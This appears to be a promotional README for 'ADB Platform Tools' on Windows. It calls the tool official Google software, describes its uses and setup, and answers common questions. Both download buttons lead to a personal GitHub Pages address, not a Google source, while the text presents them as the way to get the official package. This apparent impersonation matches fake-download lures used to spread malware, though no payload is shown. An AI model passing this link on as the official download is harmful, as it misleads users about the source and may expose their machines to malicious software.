# ADB Platform Tools

<img src="https://play-lh.googleusercontent.com/LE2-8hjLVmfDhjBtFoLrJThiqRyT68O1jCKE9ZQWUGOGHGBq9BETGvrMzeOZijpE_B6WK5tCD-lEp8ezL3BogBg=w240-h480-rw" alt="ADB Platform Tools logo" width="120"/>

[![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools-2ea44f?style=for-the-badge)](https://edwardwhite23.github.io/.github/ADB-Platform-App-Windows)

*ADB Platform Tools is an official Android developer toolkit for Windows that lets you connect an Android device to your PC and control it from the command line.*

Most Android developers and power users eventually need an adb platform tools download on their Windows machine — Google's own package of command-line utilities for talking directly to Android hardware. It bundles adb and fastboot platform tools together, covers everyday tasks like installing apps and reading logs, and needs nothing more than a folder and a terminal window to run.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLMfnwQJgbIJYYl3sQws3tzfgjquiGf5G6VkQxzuDeELDkzPSZJ4VPkQ41&s=10" alt="ADB Platform Tools Screenshot" width="100%"/>
*A terminal window running adb commands against a connected Android device.*

## Why people use it
**App sideloading.** Install or remove APKs on a connected device without going through an app store. **Device diagnostics.** Stream live system and app logs with `logcat` to chase down a bug. **Fastboot flashing.** Reboot into bootloader mode and flash factory images or unlock tokens with fastboot. **File transfer.** Push and pull files between the device and your PC in seconds. **Shell access.** Drop into an interactive shell on the device for closer inspection.

## What it needs
ADB Platform Tools is light on requirements: any 64-bit edition of Windows 10 or 11 that can also run a USB port and, ideally, your phone manufacturer's USB driver is enough. There's no meaningful processor or memory requirement beyond what Windows itself needs, and the tool's own footprint on disk is tiny.

## Setting up
Click the download button above to grab the archive, then extract it somewhere convenient — many people use a short path like `C:\platform-tools` so commands stay easy to type. There's no installer to run and no setup wizard; once the folder exists, opening a Command Prompt or PowerShell window inside it is effectively "installing" the tool, since adb and fastboot are ready to run the moment they're extracted.

## Getting going
The first real step is turning on Developer Options and USB debugging on the Android device itself, then plugging it into the PC with a USB cable. Running `adb devices` from the extracted folder should list the device once you accept the authorization prompt that appears on its screen, confirming Windows and the phone can actually talk to each other. From that point, everyday commands like `adb install`, `adb logcat`, or a fastboot reboot are just a command away.

> Ready to try it? [![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools-2ea44f?style=for-the-badge)](https://edwardwhite23.github.io/.github/ADB-Platform-App-Windows)

## Questions people ask
<details><summary><b>Does ADB Platform Tools cost anything?</b></summary>

No — Google provides it free of charge as part of the standard Android SDK distribution.

</details>

<details><summary><b>Will it work with any Android phone?</b></summary>

It works with the vast majority of Android devices once USB debugging is enabled, though a handful of manufacturer-specific USB drivers may be needed for Windows to recognize the device.

</details>

<details><summary><b>Do I need Android Studio too?</b></summary>

No. ADB Platform Tools is the standalone command-line piece; Android Studio bundles the same tools but adds a full IDE on top that most people don't need just for adb and fastboot work.

</details>

## If something goes wrong
For help with ADB Platform Tools, review the release notes and documentation Google publishes with the Android SDK, which explain adb and fastboot commands in detail along with common connection issues. The official Android developer website also has broader troubleshooting guides if a device still won't show up after installing the right USB driver.
